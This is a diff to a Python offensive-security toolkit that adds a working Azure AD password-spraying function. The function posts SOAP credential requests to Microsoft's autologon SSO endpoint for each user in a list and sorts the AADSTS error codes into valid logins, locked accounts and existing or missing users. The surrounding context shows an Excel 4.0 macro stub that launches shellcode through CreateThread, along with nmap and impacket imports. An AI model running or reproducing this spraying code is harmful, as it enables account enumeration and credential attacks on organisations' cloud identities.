@@ -26,6 +26,7 @@ import gzip
 import json
 import time
 import yaml
+import uuid
 import glob
 import shlex
 import shutil
@@ -59,7 +60,7 @@ from libnmap.parser import NmapParser
 from netaddr import IPAddress, IPRange
 from libnmap.process import NmapProcess
 from impacket.dcerpc.v5 import transport
-from datetime import datetime, timedelta, date
+from datetime import datetime, timedelta, date, timezone
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import quote, unquote, urlparse
 from impacket.dcerpc.v5.dcomrt import IObjectExporter
@@ -159,6 +160,47 @@ C;X1;Y9;ENEXT()
 C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
 C;X1;Y11;EHALT()
 """
+detailed_codes = {'AADSTS50034' : 'The user does not exist', 
+'AADSTS50053' : 'The user exists and the correct username and password were entered, but the account is locked',
+'AADSTS50056' : 'The user exists but does not have a password in Azure AD',
+'AADSTS50126' : 'The user exists, but the wrong password was entered',
+'AADSTS80014' : 'The user exists, but the maximum Pass-through Authentication time was exceeded',
+'AADSTS81016' : 'Invalid STS Request (User likely exists)' }
+
+url_template = string.Template("""https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$uuid""")
+
+xml_body = string.Template("""<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
+  <s:Header>
+    <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
+    <a:MessageID>urn:uuid:36a6762f-40a9-4279-b4e6-b01c944b5698</a:MessageID>
+    <a:ReplyTo>
+      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
+    </a:ReplyTo>
+    <a:To s:mustUnderstand="1">https://autologon.microsoftazuread-sso.com/dewi.onmicrosoft.com/winauth/trust/2005/usernamemixed?client-request-id=30cad7ca-797c-4dba-81f6-8b01f6371013</a:To>
+    <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
+      <u:Timestamp u:Id="_0">
+        <u:Created>2019-01-02T14:30:02.068Z</u:Created>
+        <u:Expires>2019-01-02T14:40:02.068Z</u:Expires>
+      </u:Timestamp>
+      <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977">
+        <o:Username>$username@$domain</o:Username>
+        <o:Password>$password</o:Password>
+      </o:UsernameToken>
+    </o:Security>
+  </s:Header>
+  <s:Body>
+    <trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
+      <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
+        <a:EndpointReference>
+          <a:Address>urn:federation:MicrosoftOnline</a:Address>
+        </a:EndpointReference>
+      </wsp:AppliesTo>
+      <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
+      <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
+    </trust:RequestSecurityToken>
+  </s:Body>
+</s:Envelope>""")
 def parse_ip_mac(input_string):
     """
     Extracts IP and MAC addresses from a formatted input string using a regular expression.
@@ -2120,6 +2162,86 @@ def activate_server(httpd, url, lhost):
     get_command(url, lhost)
     httpd.server_activate()
 
+def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
+
+	results = []
+
+	AD_codes = detailed_codes.keys()
+
+	if verbose or more_verbose:
+		print("Targeting: " + target_url + "\n")
+
+	headers = {'Content-Type':'text/xml'}
+
+	for user in users:
+		if more_verbose:
+			print("\ntesting " + user)
+		xml_data = xml_body.substitute(username=user, domain=domain, password=password)
+		r = requests.post(target_url, data=xml_data)
+	
+		if more_verbose:
+			print("Status: " + str(r.status_code))
+
+		if 'ThrottleStatus' in r.headers.keys():
+			print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))
+
+		if 'IfExistsResult' in r.content.decode('UTF-8'):
+			print(r.content)
+			sys.exit()
+		
+		if r.status_code == 200:
+			results.append([user + '@' + domain, 'Success', password])
+			if verbose:
+				print(user + "@" + domain + "\t\t:: " + password)
+			continue
+
+		for code in AD_codes:
+			if code in r.content.decode('UTF-8'):
+				if code == 'AADSTS50034':
+					results.append([user + "@" + domain, code, 'NOUSER'])
+				else:
+					results.append([user + "@" + domain, code, 'User Exists'])
+				if more_verbose:
+					print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
+				break
+		time.sleep(wait)
+		
+	return results
+
+
+def ProcessResults(results, outfile):
+	
+	for result in results:
+		if result[1] == 'Success':
+			outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
+		else:
+			continue
+	
+	for result in results:
+		if result[1] == 'Success':
+			continue
+		else:
+			outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")
+
+def generate_index(repo_dir):
+    simple_dir = os.path.join(repo_dir, 'simple')
+    os.makedirs(simple_dir, exist_ok=True)
+
+    index_content = []
+    for package in os.listdir(repo_dir):
+        if package.endswith(('.whl', '.tar.gz')):
+            package_name = package.split('-')[0]
+            package_dir = os.path.join(simple_dir, package_name)
+            os.makedirs(package_dir, exist_ok=True)
+            shutil.move(os.path.join(repo_dir, package), os.path.join(package_dir, package))
+            index_content.append(f'<a href="{package_name}/">{package_name}</a><br>')
+
+    with open(os.path.join(simple_dir, 'index.html'), 'w') as index_file:
+        index_file.write('<html><body>\n')
+        index_file.write('<h1>Simple Index</h1>\n')
+        index_file.write(''.join(index_content))
+        index_file.write('</body></html>\n')
+        
 signal.signal(signal.SIGINT, signal_handler)
 arguments = sys.argv[1:]  
 
